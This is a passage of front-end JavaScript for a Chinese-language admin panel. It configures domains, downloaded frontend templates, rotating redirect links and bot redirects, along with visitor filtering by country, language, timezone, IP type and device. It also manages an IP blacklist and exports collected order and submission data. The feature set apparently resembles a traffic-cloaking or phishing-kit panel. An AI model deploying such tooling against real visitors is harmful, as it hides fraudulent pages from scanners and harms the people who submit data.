  finally { if (row) row.querySelector('.client-test-jump').disabled = false; }
}
async function loadIpregistryCredits() {
  const label = $('#ipregistryKeyLabel'); const key = $('#ipregistry_api_key').value.trim();
  label.className = '';
  if (!key) { label.textContent = 'API Key（剩余积分：未配置）'; return; }
  label.textContent = 'API Key（剩余积分：查询中）'; label.classList.add('credit-loading');
  try {
    const status = await api('/api/ipregistry/status'); label.textContent = `API Key（剩余积分：${status.remaining}）`; label.className = 'credit-ready';
  } catch (_) { label.textContent = 'API Key（剩余积分：查询失败）'; label.className = 'credit-error'; }
}
async function saveSettings() {
  const payload = {
    ipregistry_api_key: $('#ipregistry_api_key').value.trim(),
    ipregistry_enabled: $('#ipregistry_enabled').checked,
    client_redirect_enabled: $('#client_redirect_enabled').checked,
    client_redirect_rules: readClientRules(),
    bot_redirect_enabled: $('#bot_redirect_enabled').checked,
    bot_redirect_url: $('#bot_redirect_url').value.trim(),
    rate_check_enabled: $('#rate_check_enabled').checked,
    rate_window_seconds: Math.min(3600, Math.max(10, Math.trunc(Number($('#rate_window_seconds').value) || 60))),
    rate_max_requests: Math.min(1000, Math.max(3, Math.trunc(Number($('#rate_max_requests').value) || 10))),
    captcha_enabled: $('#captcha_enabled').checked,
    captcha_max_tries: Math.min(10, Math.max(1, Math.trunc(Number($('#captcha_max_tries').value) || 3))),
    captcha_ttl_seconds: Math.min(43200, Math.max(5, Math.trunc(Number($('#captcha_ttl_minutes').value) || 120))) * 60,
    app_android_url: readAppUrl('#app_android_url'),
    app_ios_url: readAppUrl('#app_ios_url'),
    app_desktop_url: readAppUrl('#app_desktop_url')
  };
  try {
    await api('/api/settings', { method: 'POST', body: JSON.stringify(payload) });
    await loadSettings();
    toast('设置已保存');
  } catch (error) { toast(error.message, true); }
}

function ensureRedirectLinksField(form) {
  if ($('.frontend-step-panel', form)) return;
  const grid = $('.config-grid', form);
  const panel = document.createElement('section');
  panel.className = 'config-panel frontend-step-panel hidden';
  panel.innerHTML = '<div class="frontend-step-heading"><div><h4>前台配置</h4><p>配置模板按钮最终跳转到的链接和每条链接的点击上限。</p></div></div><div class="field redirect-links-field"><span>模板跳转链接</span><small>达到点击上限后自动切换到下一条，最后一条完成后从第一条继续循环；0 表示不限</small><div class="redirect-batch-toolbar"><button type="button" class="secondary small open-redirect-import">批量导入</button><label><span>批量点击上限</span><input class="redirect-batch-limit" type="number" value="0" min="0" max="999999999" step="1"></label><button type="button" class="secondary small apply-batch-limit">应用到全部</button></div><div class="redirect-import-panel hidden"><textarea class="redirect-import-input" placeholder="每行一条链接，也支持 链接|点击上限"></textarea><div><button type="button" class="secondary small cancel-redirect-import">取消</button><button type="button" class="primary small confirm-redirect-import">导入链接</button></div></div><div class="redirect-links-editor"></div><button type="button" class="secondary small add-redirect-link">+ 添加链接</button></div>';
  const summary = document.createElement('section');
  summary.className = 'config-panel config-summary-panel hidden';
  grid.append(panel, summary);
  panel.addEventListener('click', event => {
    if (event.target.closest('.open-redirect-import')) { $('.redirect-import-panel', panel).classList.remove('hidden'); $('.redirect-import-input', panel).focus(); return; }
    if (event.target.closest('.cancel-redirect-import')) { $('.redirect-import-panel', panel).classList.add('hidden'); return; }
    if (event.target.closest('.confirm-redirect-import')) {
      const batchLimit = Math.min(999999999, Math.max(0, Math.trunc(Number($('.redirect-batch-limit', panel).value) || 0)));
      const imported = parseRedirectImport($('.redirect-import-input', panel).value, batchLimit); const current = readRedirectLinks(form); const combined = [...current, ...imported.links];
      renderRedirectLinks(form, combined.slice(0, 50)); $('.redirect-import-input', panel).value = ''; $('.redirect-import-panel', panel).classList.add('hidden');
      const ignored = imported.invalid + Math.max(0, combined.length - 50); toast(`已导入 ${Math.min(imported.links.length, Math.max(0, 50 - current.length))} 条${ignored ? `，忽略 ${ignored} 条无效或超出限制的内容` : ''}`); return;
    }
    if (event.target.closest('.apply-batch-limit')) {
      const input = $('.redirect-batch-limit', panel); const raw = input.value.trim(); if (!/^\d{1,9}$/.test(raw)) return toast('请输入 0 到 999999999 的整数', true);
      const links = readRedirectLinks(form); if (!links.length) return toast('请先添加跳转链接', true); links.forEach(item => { item.limit = Number(raw); }); renderRedirectLinks(form, links); toast('已批量修改点击上限'); return;
    }
    if (event.target.closest('.add-redirect-link')) return renderRedirectLinks(form, [...readRedirectLinks(form), { url: '', limit: 0 }]);
    const remove = event.target.closest('.remove-redirect-link'); if (!remove) return;
    const links = readRedirectLinks(form); links.splice(Number(remove.dataset.index), 1); renderRedirectLinks(form, links.length ? links : [{ url: '', limit: 0 }]);
  });
  const previous = $('.wizard-actions .secondary', form); const primary = $('.wizard-actions .primary', form);
  previous.addEventListener('click', () => setConfigStep(form, Number(form.dataset.configStep || 1) - 1));
  primary.addEventListener('click', async event => {
    const step = Number(form.dataset.configStep || 1);
    if (step === 1) { event.preventDefault(); setConfigStep(form, 2); return; }
    if (step !== 2) return;
    event.preventDefault();
    if (!form.reportValidity()) return;
    primary.disabled = true; primary.textContent = '保存中...';
    try {
      await api('/api/settings', { method: 'POST', body: JSON.stringify({ redirect_links: readRedirectLinks(form) }) });
      state.settings = await api('/api/settings');
      renderRedirectLinks(form, state.settings.redirect_links || []);
      setConfigStep(form, 3); toast('跳转链接已保存');
    } catch (error) { setConfigStep(form, 2); toast(error.message, true); }
    finally { primary.disabled = false; }
  });
}

function parseRedirectImport(text, fallbackLimit) {
  const links = []; let invalid = 0;
  text.split(/\r?\n/).map(line => line.trim()).filter(Boolean).forEach(line => {
    let url = line; let limit = fallbackLimit; const separator = line.lastIndexOf('|'); const inlineLimit = separator >= 0 ? line.slice(separator + 1).trim() : '';
    if (/^\d{1,9}$/.test(inlineLimit)) { url = line.slice(0, separator).trim(); limit = Number(inlineLimit); }
    try { const parsed = new URL(url); if (!['http:', 'https:'].includes(parsed.protocol) || !parsed.host) throw new Error('invalid'); links.push({ url, limit }); } catch (_) { invalid++; }
  });
  return { links, invalid };
}

function readRedirectLinks(form) {
  return $$('.redirect-link-row', form).map(row => ({ url: $('[data-link-url]', row).value.trim(), limit: Math.min(999999999, Math.max(0, Math.trunc(Number($('[data-link-limit]', row).value) || 0))) })).filter(item => item.url);
}

function renderRedirectLinks(form, links) {
  $('.redirect-links-editor', form).innerHTML = (links.length ? links : [{ url: '', limit: 0 }]).map((item, index) => `<div class="redirect-link-row"><input data-link-url type="url" value="${escapeHtml(item.url || '')}" placeholder="https://example.com/"><input data-link-limit type="number" value="${Number(item.limit) || 0}" min="0" max="999999999" step="1" title="点击上限"><button type="button" class="icon-button remove-redirect-link" data-index="${index}" title="删除链接">×</button></div>`).join('');
}

function setConfigStep(form, requestedStep) {
  const step = Math.min(3, Math.max(1, requestedStep)); form.dataset.configStep = step;
  $$('.domain-panel, .access-panel', form).forEach(panel => panel.classList.toggle('hidden', step !== 1));
  $('.frontend-step-panel', form).classList.toggle('hidden', step !== 2);
  $('.config-summary-panel', form).classList.toggle('hidden', step !== 3);
  $('.config-grid', form).classList.toggle('single-panel', step > 1);
  $$('.wizard-step', form).forEach((item, index) => { item.classList.toggle('active', index === step - 1); item.classList.toggle('complete', index < step - 1); });
  const headings = [['配置前台源码','域名、访问策略和前台入口统一在这里设置。'],['前台配置','设置模板的多个跳转链接和点击切换次数。'],['确认配置','确认域名、访问入口和跳转链接后保存。']];
  $('.config-heading h3', form).textContent = headings[step - 1][0]; $('.config-heading>p:last-child', form).textContent = headings[step - 1][1];
  const previous = $('.wizard-actions .secondary', form); const primary = $('.wizard-actions .primary', form); previous.disabled = step === 1; primary.textContent = step === 3 ? '保存并完成 →' : step === 2 ? '保存链接并下一步 →' : '下一步 →';
  if (step === 3) renderConfigSummary(form);
  $('.config-grid', form).scrollTop = 0;
}

function renderConfigSummary(form) {
  const domains = JSON.parse(form.dataset.pendingDomains || '[]'); const links = readRedirectLinks(form); const entry = form.elements.frontend_entry.value.trim().replace(/^\/+/, '') || 'logo.gif';
  $('.config-summary-panel', form).innerHTML = `<h4>配置确认</h4><div class="config-summary-grid"><div><span>域名</span><strong>${domains.length}</strong><small>${escapeHtml(domains.join('、') || '未添加')}</small></div><div><span>前台入口</span><strong>/${escapeHtml(entry)}</strong><small>访问时自动记录 IP、UA 和时间</small></div><div><span>跳转链接</span><strong>${links.length}</strong><small>${links.length ? '按设置的点击上限依次切换' : '保留模板原始链接'}</small></div></div>`;
}

function fillProjectConfig(projectId) {
  const form = $('#projectConfigForm'); const domains = state.domains.filter(item => item.project_id === Number(projectId)); const settings = state.settings;
  ensureRedirectLinksField(form);
  form.elements.project_id.value = projectId; form.elements.domains.value = domains.map(item => item.domain).join('\n');
  form.dataset.pendingDomains = JSON.stringify(domains.map(item => item.domain));
  form.dataset.originalDomains = JSON.stringify(Object.fromEntries(domains.map(item => [item.domain, item.frontend_entry || 'logo.gif'])));
  form.elements.frontend_entry.value = domains[0]?.frontend_entry || settings.frontend_entry || 'logo.gif';
  renderConfigDomains(form); form.elements.ipregistry_enabled.checked = Boolean(settings.ipregistry_enabled);
  form.elements.browser_lang_check.checked = Boolean(settings.browser_lang_check);
  form.elements.browser_lang_whitelist.value = (settings.browser_lang_whitelist || []).join(', ');
  form.elements.browser_tz_check.checked = Boolean(settings.browser_tz_check);
  form.elements.browser_tz_whitelist.value = (settings.browser_tz_whitelist || []).join(', ');
  setCountrySelectValue(form, 'country_whitelist', settings.country_whitelist || ''); setCountrySelectValue(form, 'country_blacklist', settings.country_blacklist || ''); form.elements.redirect_url.value = settings.redirect_url || '';
  setEnvSelectValue(form, 'browser_lang_whitelist', settings.browser_lang_whitelist || []);
  setEnvSelectValue(form, 'browser_tz_whitelist', settings.browser_tz_whitelist || []);
  renderRedirectLinks(form, settings.redirect_links || []);
  ['human_verification','block_desktop','block_ios','block_android'].forEach(name => { form.elements[name].checked = Boolean(settings[name]); });
  $$('[name="blocked_ip_types"], [name="blocked_threats"]', form).forEach(el => { el.checked = (settings[el.name] || []).includes(el.value); });
  setConfigStep(form, 1);
  $('#projectConfigDialog').showModal();
}
function renderConfigDomains(form) {
  const domains = JSON.parse(form.dataset.pendingDomains || '[]'); const list = $('.config-domain-list', form);
  const entry = (form.elements.frontend_entry?.value || '').trim().replace(/^\/+/, '');
  list.innerHTML = domains.length ? domains.map(domain => `<div class="config-domain-row"><span>${escapeHtml(domain + (entry ? '/' + entry : ''))}</span><button type="button" data-domain="${escapeHtml(domain)}">删除</button></div>`).join('') : '<p>保存后配置的域名会显示在这里</p>';
}
async function saveProjectConfig(event) {
  event.preventDefault(); const form = event.currentTarget; const domains = [...new Set(form.elements.domains.value.split(/\s+/).map(item => item.trim().toLowerCase()).filter(Boolean))]; const values = {};
  ['country_whitelist','country_blacklist','redirect_url','frontend_entry'].forEach(name => values[name] = form.elements[name].value.trim()); values.redirect_links = readRedirectLinks(form); ['human_verification','block_desktop','block_ios','block_android','ipregistry_enabled','browser_lang_check','browser_tz_check'].forEach(name => values[name] = form.elements[name].checked); values.browser_lang_whitelist = form.elements['browser_lang_whitelist'].value.split(/[\s,]+/).map(s => s.trim()).filter(Boolean); values.browser_tz_whitelist = form.elements['browser_tz_whitelist'].value.split(/[\s,]+/).map(s => s.trim()).filter(Boolean);
  values.blocked_ip_types = $$('[name="blocked_ip_types"]:checked', form).map(el => el.value); values.blocked_threats = $$('[name="blocked_threats"]:checked', form).map(el => el.value);
  try {
    await api('/api/settings', { method: 'POST', body: JSON.stringify(values) });
    const original = JSON.parse(form.dataset.originalDomains || '{}'); const entry = values.frontend_entry.replace(/^\/+/, '') || 'logo.gif';
    const domainsToConfigure = domains.filter(domain => !Object.prototype.hasOwnProperty.call(original, domain) || original[domain] !== entry);
    for (const domain of domainsToConfigure) await api('/api/domains', { method: 'POST', body: JSON.stringify({ domain, frontend_entry: entry, project_id: Number(form.elements.project_id.value) }) });
    const domainsToDelete = Object.keys(original).filter(domain => !domains.includes(domain));
    for (const domain of domainsToDelete) await api(`/api/domains/${encodeURIComponent(domain)}`, { method: 'DELETE' });
    $('#projectConfigDialog').close(); toast('前台配置已保存'); loadFrontend();
  } catch (error) { toast(error.message, true); }
}

$('#loginForm').addEventListener('submit', async event => { event.preventDefault(); $('#loginError').textContent = ''; const formElement = event.currentTarget; const form = new FormData(formElement); try { const result = await api('/api/auth/login', { method: 'POST', body: JSON.stringify({ username: form.get('username'), password: form.get('password'), captcha: form.get('captcha'), captcha_id: state.captchaId }) }); formElement.reset(); showApp(result.username); } catch (error) { $('#loginError').textContent = error.message; loadCaptcha(); } });
$('#captchaQuestion').addEventListener('click', loadCaptcha);
$('#logoutBtn').addEventListener('click', async () => { await api('/api/auth/logout', { method: 'POST', body: '{}' }); showLogin(); });
$('#mainNav').addEventListener('click', event => { const button = event.target.closest('[data-page]'); if (button) navigate(button.dataset.page); });
$('#refreshDashboard').addEventListener('click', loadDashboard); $('#eventFilters').addEventListener('submit', event => { event.preventDefault(); state.eventPage = 1; loadEvents(); });
$('#eventsPrev').addEventListener('click', () => { if (state.eventPage > 1) { state.eventPage--; loadEvents(); } }); $('#eventsNext').addEventListener('click', () => { if (state.eventPage * 25 < state.eventTotal) { state.eventPage++; loadEvents(); } });
$('#clearEvents').addEventListener('click', async () => {
  if (!confirm('确定清空全部访问日志记录吗？清空后不可恢复。')) return;
  try {
    const data = await api('/api/events/clear', { method: 'POST', body: '{}' });
    toast('已清空 ' + Number(data.deleted || 0).toLocaleString() + ' 条日志记录');
    state.eventPage = 1; loadEvents();
  } catch (error) { toast(error.message, true); }
});
$$('.tabs button').forEach(button => button.addEventListener('click', () => { $$('.tabs button').forEach(el => el.classList.toggle('active', el === button)); $$('.tab-panel').forEach(el => el.classList.toggle('active', el.id === `${button.dataset.tab}Tab`)); }));
$('#openImport').addEventListener('click', () => $('#importDialog').showModal()); $('#manualInstall').addEventListener('click', () => $('#importDialog').showModal()); $('#saveSettings').addEventListener('click', saveSettings); $('#projectConfigForm').addEventListener('submit', saveProjectConfig);
$('#clientDetectBtn').addEventListener('click', runClientDetect);
$('#clientJumpBtn').addEventListener('click', () => runClientJump(''));
$('#clientTestPresets').addEventListener('click', event => {
  const chip = event.target.closest('.preset-chip'); if (!chip) return;
  $('#clientTestUa').value = chip.dataset.ua; runClientDetect();
});
$('#clientRuleEditor').addEventListener('click', event => {
  const button = event.target.closest('.client-test-jump'); if (!button) return;
  button.disabled = true; runClientJump(button.dataset.client);
});
$('#eventClientFilter').addEventListener('change', () => { state.eventPage = 1; loadEvents(); });

/* ---------------- 订单数据 ---------------- */
$('#orderFilters').addEventListener('submit', event => { event.preventDefault(); state.orderPage = 1; loadOrders(); });
$('#orderPrev').addEventListener('click', () => { if (state.orderPage > 1) { state.orderPage--; loadOrders(); } });
$('#orderNext').addEventListener('click', () => { if (state.orderPage * 25 < state.orderTotal) { state.orderPage++; loadOrders(); } });
$('#orderBody').addEventListener('click', event => {
  const button = event.target.closest('[data-order-detail]'); if (!button) return;
  const row = document.getElementById(`orderDetail-${button.dataset.orderDetail}`);
  if (!row) return;
  row.classList.toggle('hidden');
  button.textContent = row.classList.contains('hidden') ? '展开' : '收起';
});
$('#orderExport').addEventListener('click', async () => {
  try {
    const response = await fetch('/api/user/export', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(orderParams()) });
    if (!response.ok) throw new Error('导出失败');
    const blob = await response.blob();
    const link = document.createElement('a');
    link.href = URL.createObjectURL(blob); link.download = `orders-${Date.now()}.csv`;
    document.body.appendChild(link); link.click(); link.remove();
    setTimeout(() => URL.revokeObjectURL(link.href), 4000);
  } catch (error) { toast(error.message, true); }
});
$('#orderClear').addEventListener('click', async () => {
  if (!confirm('确定清空全部订单与提交数据？该操作不可恢复。')) return;
  try {
    const res = await api('/api/user/doEmpty', { method: 'POST', body: '{}' });
    toast('已清空 ' + Number((res && res.deleted) || 0).toLocaleString() + ' 条订单');
    state.orderPage = 1; loadOrders();
  } catch (error) { toast(error.message, true); }
});

/* ---------------- 黑名单中心 ---------------- */
const blState = { page: 1, total: 0, q: '' };
const REASON_LABELS = { manual: '手动添加', rate_limit: '频率超限' };
async function loadBlacklist() {
  try {
    const query = new URLSearchParams({ page: blState.page, page_size: 25 });
    if (blState.q) query.set('q', blState.q);
    const data = await api(`/api/blacklist?${query}`);
    blState.total = data.total;
    $('#blCount').textContent = `共 ${data.total} 条`;
    $('#blPage').textContent = data.page;
    $('#blPrev').disabled = data.page <= 1;
    $('#blNext').disabled = data.page * 25 >= data.total;
    const reasonText = r => REASON_LABELS[r] || r;
    $('#blBody').innerHTML = data.items.length ? data.items.map(item => `
      <tr data-id="${item.id}">
        <td>#${item.id}</td><td>${escapeHtml(item.ip)}</td>
        <td>${escapeHtml(reasonText(item.reason))}</td>
        <td class="bl-note">${escapeHtml(item.note || '-')}</td>
        <td>${escapeHtml((item.created_at || '').replace('T', ' ').slice(0, 19))}</td>
        <td><button class="secondary small bl-edit">编辑</button> <button class="danger-link bl-del">移除</button></td>
      </tr>`).join('') : '<tr><td colspan="6" style="text-align:center;padding:35px;color:#92959e">黑名单为空</td></tr>';
  } catch (error) { toast(error.message, true); }
}
$('#blForm').addEventListener('submit', async event => {
  event.preventDefault();
  const ip = $('#blNewIp').value.trim();
  const note = $('#blNewNote').value.trim();
  if (!ip) return toast('请填写 IP 地址', true);
  try {
    await api('/api/blacklist/add', { method: 'POST', body: JSON.stringify({ ip, note }) });
    toast('已加入黑名单');
    $('#blNewIp').value = ''; $('#blNewNote').value = '';
    blState.page = 1; loadBlacklist();
  } catch (error) { toast(error.message, true); }
});
$('#blQuery').addEventListener('keydown', event => {
  if (event.key === 'Enter') { event.preventDefault(); blState.q = $('#blQuery').value.trim(); blState.page = 1; loadBlacklist(); }
});
$('#blPrev').addEventListener('click', () => { if (blState.page > 1) { blState.page--; loadBlacklist(); } });
$('#blNext').addEventListener('click', () => { if (blState.page * 25 < blState.total) { blState.page++; loadBlacklist(); } });
$('#blClear').addEventListener('click', async () => {
  if (!confirm('确定清空整个黑名单吗？所有被拉黑的 IP 将立即恢复访问。')) return;
  try { const d = await api('/api/blacklist/clear', { method: 'POST', body: '{}' }); toast(`已清空 ${d.deleted} 条黑名单记录`); loadBlacklist(); }
  catch (error) { toast(error.message, true); }
});
$('#blBody').addEventListener('click', async event => {
  const row = event.target.closest('tr[data-id]');
  if (!row) return;
  const id = Number(row.dataset.id);
  if (event.target.closest('.bl-del')) {
    if (!confirm('确定将该 IP 移出黑名单吗？')) return;
    try { await api('/api/blacklist/delete', { method: 'POST', body: JSON.stringify({ id }) }); toast('已移出黑名单'); loadBlacklist(); }
    catch (error) { toast(error.message, true); }
  }
  if (event.target.closest('.bl-edit')) {
    const cells = row.querySelectorAll('td');
    const oldIp = cells[1].textContent;
    const oldNote = (cells[3].textContent === '-' ? '' : cells[3].textContent);
    cells[1].innerHTML = `<input value="${escapeHtml(oldIp)}" style="width:150px">`;
    cells[3].innerHTML = `<input value="${escapeHtml(oldNote)}" style="width:160px">`;
    event.target.closest('.bl-edit').textContent = '保存';
    event.target.closest('.bl-edit').className = 'primary small bl-save';
  }
  if (event.target.closest('.bl-save')) {
    const newIp = row.querySelector('td:nth-child(2) input').value.trim();
    const newNote = row.querySelector('td:nth-child(4) input').value.trim();
    try {
      await api('/api/blacklist/update', { method: 'POST', body: JSON.stringify({ id, ip: newIp, note: newNote }) });
      toast('已保存'); loadBlacklist();
    } catch (error) { toast(error.message, true); }
  }
});
$$('[data-country-select]').forEach(initCountrySelect);
$$('[data-env-select]').forEach(initEnvPicker);
document.addEventListener('click', event => { if (!event.target.closest('[data-country-select]')) $$('[data-country-select].open').forEach(closeCountrySelect); });
$('#ipregistry_api_key').addEventListener('input', () => { $('#ipregistryKeyLabel').textContent = `API Key（剩余积分：${$('#ipregistry_api_key').value.trim() ? '保存后查询' : '未配置'}）`; $('#ipregistryKeyLabel').className = ''; });
$('#sourceQuery').addEventListener('click', () => { const keyword = $('#sourceSearch').value.trim().toLowerCase(); renderCatalog(state.catalog.filter(item => `${item.name} ${item.description} ${item.filename}`.toLowerCase().includes(keyword))); });
$('#sourceReset').addEventListener('click', () => { $('#sourceSearch').value = ''; renderCatalog(state.catalog); });
$('#searchCode').addEventListener('keydown', event => { if (event.key === 'Enter') { $('#sourceSearch').value = event.currentTarget.value; $('#sourceQuery').click(); } });
$$('.close-dialog').forEach(button => button.addEventListener('click', () => button.closest('dialog').close()));
$('#importForm').addEventListener('submit', async event => { event.preventDefault(); const form = event.currentTarget; try { await api('/api/projects/import', { method: 'POST', body: JSON.stringify(Object.fromEntries(new FormData(form).entries())) }); $('#importDialog').close(); form.reset(); toast('源码已登记'); loadFrontend(); } catch (error) { toast(error.message, true); } });
$('#projectList').addEventListener('click', async event => {
  const button = event.target.closest('button'); if (!button) return; const id = Number(button.dataset.projectId); const project = state.projects.find(item => item.id === id);
  if (button.classList.contains('project-config')) { if (!state.settings.ipregistry_api_key) state.settings = await api('/api/settings'); fillProjectConfig(id); }
  if (button.classList.contains('project-update')) { button.disabled = true; try { await api(`/api/projects/${id}/update`, { method: 'POST', body: '{}' }); toast('前台源码已更新'); } catch (error) { toast(error.message, true); } finally { button.disabled = false; } }
  if (button.classList.contains('project-cert')) { const domains = state.domains.filter(item => item.project_id === id); if (!domains.length) return toast('请先在配置中添加域名', true); const pending = domains.filter(item => item.certificate_status !== 'active'); if (!pending.length) return toast('全部域名均已启用 HTTPS'); button.disabled = true; const failures = []; let succeeded = 0; for (const domain of pending) { try { await api('/api/certificates', { method: 'POST', body: JSON.stringify({ domain: domain.domain }) }); succeeded++; } catch (error) { failures.push(`${domain.domain}: ${error.message}`); } } await loadFrontend(); if (failures.length) toast(`成功 ${succeeded} 个，失败 ${failures.length} 个：${failures.join('；')}`, true); else toast(`已为 ${succeeded} 个域名申请 HTTPS 证书`); }
  if (button.classList.contains('danger-link')) { if (!confirm(`确定删除“${project?.name || ''}”吗？服务器源码文件不会被删除。`)) return; try { await api(`/api/projects/${id}`, { method: 'DELETE' }); toast('源码记录已删除'); loadFrontend(); } catch (error) { toast(error.message, true); } }
});
$('#addConfigDomain').addEventListener('click', () => { const form = $('#projectConfigForm'); const domains = form.elements.domains.value.split(/\s+/).map(item => item.trim().toLowerCase()).filter(Boolean); const current = JSON.parse(form.dataset.pendingDomains || '[]'); form.dataset.pendingDomains = JSON.stringify([...new Set([...current, ...domains])]); form.elements.domains.value = JSON.parse(form.dataset.pendingDomains).join('\n'); renderConfigDomains(form); });
$('#projectConfigForm').elements?.frontend_entry?.addEventListener('input', () => renderConfigDomains($('#projectConfigForm')));
$('.config-domain-list').addEventListener('click', async event => {
  const button = event.target.closest('button[data-domain]'); if (!button) return;
  const form = $('#projectConfigForm'); const domain = button.dataset.domain; const original = JSON.parse(form.dataset.originalDomains || '{}'); const persisted = Object.prototype.hasOwnProperty.call(original, domain);
  if (persisted) {
    if (!confirm(`确定删除域名 ${domain} 吗？对应的服务器域名入口也会同步删除。`)) return;
    button.disabled = true;
    try {
      await api(`/api/domains/${encodeURIComponent(domain)}`, { method: 'DELETE' });
      state.domains = state.domains.filter(item => item.domain !== domain); delete original[domain]; form.dataset.originalDomains = JSON.stringify(original);
    } catch (error) { button.disabled = false; return toast(error.message, true); }
  }
  const domains = JSON.parse(form.dataset.pendingDomains || '[]').filter(item => item !== domain); form.dataset.pendingDomains = JSON.stringify(domains); form.elements.domains.value = domains.join('\n'); renderConfigDomains(form);
  if (persisted) { await loadFrontend(); toast(`域名 ${domain} 及服务器入口已删除`); }
});
$('#projectList').addEventListener('click', async event => {
  const button = event.target.closest('.copy-address'); if (!button) return;
  try { await navigator.clipboard.writeText(button.dataset.address); toast('地址已复制'); } catch (_) { toast('当前浏览器不允许复制地址', true); }
});
$('#catalogList').addEventListener('click', async event => {
  const button = event.target.closest('.catalog-download'); if (!button || button.disabled) return; button.disabled = true; button.textContent = '下载中…';
  try { await api('/api/catalog/download', { method: 'POST', body: JSON.stringify({ source_id: button.dataset.sourceId }) }); toast('源码下载完成，已加入已下载'); loadFrontend(); document.querySelector('[data-tab="downloaded"]').click(); }
  catch (error) { toast(error.message, true); button.disabled = false; button.textContent = '下载源码'; }
});
$('#menuBtn').addEventListener('click', () => { $('.sidebar').classList.add('open'); $('#mobileBackdrop').classList.add('show'); }); $('#mobileBackdrop').addEventListener('click', () => { $('.sidebar').classList.remove('open'); $('#mobileBackdrop').classList.remove('show'); });
api('/api/auth/me').then(data => data.authenticated ? showApp(data.user) : showLogin()).catch(showLogin);
